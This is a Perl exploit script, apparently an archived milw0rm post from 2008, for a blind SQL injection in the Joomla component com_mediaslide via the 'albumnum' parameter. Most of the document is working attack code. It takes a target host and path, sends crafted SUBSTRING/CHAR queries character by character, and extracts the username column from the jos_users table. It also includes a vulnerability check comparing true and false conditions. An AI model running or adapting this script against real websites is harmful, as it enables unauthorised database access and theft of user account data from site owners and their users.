<html><head><title>Joomla Component mediaslide (albumnum) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#inphex
#joomla com_mediaslide blind sql injection
use LWP::UserAgent;
use LWP::Simple;
use Switch;
use Digest::MD5 qw(md5 md5_hex md5_base64);
print &quot;usage: $0 -h host.com -p /\n&quot;;
### use Getopt::Long; ###
$column = &quot;username&quot;;
$table = &quot;jos_users&quot;;
$regex = &quot;preview_f2&quot;;
%cm_n_ = (&quot;-h&quot; =&gt; &quot;host&quot;,&quot;-p&quot; =&gt; &quot;path&quot;,&quot;-c&quot; =&gt; &quot;column&quot;,&quot;-t&quot; =&gt; &quot;table&quot;,&quot;-r&quot; =&gt; &quot;regex&quot;);
$a = 0;
foreach  (@ARGV) {
	$a++;
	while (($k, $v) = each(%cm_n_)) {
		if ($_ eq $k) {
			${$v} = $ARGV[$a];
		}
	}
}

$i = 48;
$h = 1;
$f = 0;
$k = 0;
### Yeah,that's it... ###
while () {
    while ($i &lt;= 90) {
		
	    if(check($i,$h,1) == 1)
	    {
	    	syswrite STDOUT,lc(chr($i));
	    	$h++;
			$a_chr = $a_chr.chr($i);
	    } 
		
		$i++;
		
	} 
	push(@ffs,length($a_chr)); 
	if (($#ffs -1) == $ffs) {
		&amp;check_vuln();
		exit;
	}
	$i = 48;
	
}
#/

### :D ###
sub check($$$)
{
	$i = shift;
	$h = shift;
	$m = shift;

	switch ($m)
	{
		case 1 { $query = &quot;%20AND%20SUBSTRING((SELECT%20&quot;.$column.&quot;%20FROM%20&quot;.$table.&quot;%20LIMIT%200,1),&quot;.$h.&quot;,1)=CHAR(&quot;.$i.&quot;)&quot;; }
	}

	$ua = LWP::UserAgent-&gt;new;
	$url = &quot;http://&quot;.$host.$path.&quot;index.php?option=com_mediaslide&amp;act=contact&amp;id=1&amp;albumnum=1&quot;.$query.&quot;&quot;;
	$response = $ua-&gt;get($url);
	$content = $response-&gt;content;
	if($content =~ /$regex/) { return 0;} else { return 1 ;}
}
#/

sub check_vuln
{
	

	$content = get(&quot;http://&quot;.$host.$path.&quot;index.php?option=com_mediaslide&amp;act=contact&amp;id=1&amp;albumnum=1%20AND%201=1&quot;);
	$content1 = get(&quot;http://&quot;.$host.$path.&quot;index.php?option=com_mediaslide&amp;act=contact&amp;id=1&amp;albumnum=1%20AND%201=0&quot;);

	foreach $bb1 (split(/\n/,$content)) {
		$bb = $bb.$bb1;
	}

	foreach  $yy1 (split(/\n/,$content1)) {
		$yy = $yy.$yy1;
	}

	$f =  md5_hex($bb);
	$s = md5_hex($yy);

	if ($f eq $s) {
		print &quot;\nprobably not vulnerable&quot;;    #could be that ads,texts etc.. change
		exit;
	} else { print &quot;\nvulnerable...&quot;; }
}

# milw0rm.com [2008-02-14]</pre></html>